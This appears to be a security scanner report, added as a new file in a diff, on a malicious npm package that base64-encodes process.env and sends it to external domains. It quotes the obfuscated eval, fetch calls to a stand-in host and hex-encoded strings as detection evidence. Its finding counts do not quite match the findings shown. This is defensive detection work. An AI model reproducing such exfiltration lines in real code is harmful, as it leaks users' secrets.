@@ -1,0 +1,77 @@
+# Scanner Output - 2026-01-05T14:32:00Z
+# Source: @solomon-labs/security-scanner v2.4.1
+# Scan ID: scan-abc123def456
+
+================================================================================
+CRITICAL FINDING
+================================================================================
+
+Package: event-stream-utils@2.1.4
+Location: node_modules/event-stream-utils/lib/collector.js
+Rule: EXFIL-001 (Obfuscated exfiltration pattern)
+Confidence: HIGH
+
+Matched Pattern:
+  Line 47: eval(atob("cHJvY2Vzcy5lbnY="))
+  Line 52: fetch("https://telemetry-cdn.example.net/collect", {...})
+  Line 58: Buffer.from(JSON.stringify(process.env)).toString("base64")
+
+Analysis:
+  - Base64 decode of "cHJvY2Vzcy5lbnY=" = "process.env"
+  - Network call to unrecognized domain
+  - Environment variable serialization detected
+
+Risk Assessment:
+  - Data Type: Environment variables, potential secrets
+  - Exfiltration Vector: HTTPS POST to external domain
+  - Obfuscation: Base64 encoding, eval usage
+
+================================================================================
+
+Package: event-stream-utils@2.1.4
+Location: node_modules/event-stream-utils/lib/collector.js
+Rule: NETCALL-002 (Undeclared network endpoint)
+Confidence: HIGH
+
+Matched Pattern:
+  Line 52: fetch("https://telemetry-cdn.example.net/collect", {...})
+  Line 61: fetch("https://api.metrics-collector.io/v1/data", {...})
+
+Analysis:
+  - Domain telemetry-cdn.example.net not in package.json dependencies
+  - Domain api.metrics-collector.io not in package.json dependencies
+  - No legitimate telemetry functionality declared
+
+================================================================================
+
+Package: event-stream-utils@2.1.4
+Location: node_modules/event-stream-utils/index.js
+Rule: OBFUSC-003 (Suspicious string obfuscation)
+Confidence: MEDIUM
+
+Matched Pattern:
+  Line 12: const _0x4a3b = ["\x70\x72\x6f\x63\x65\x73\x73", "\x65\x6e\x76"];
+
+Analysis:
+  - Hex-encoded string literals
+  - Decoded values: "process", "env"
+  - Common obfuscation technique for malicious packages
+
+================================================================================
+SCAN SUMMARY
+================================================================================
+
+Total packages scanned: 1,247
+Critical findings: 3
+High findings: 0
+Medium findings: 1
+Low findings: 12
+
+Affected package: event-stream-utils@2.1.4
+Introduced via: @example/logger@4.2.0 -> event-stream-utils@2.1.4
+
+Recommendation: IMMEDIATE REMOVAL REQUIRED
+
+================================================================================
+END OF REPORT
+================================================================================
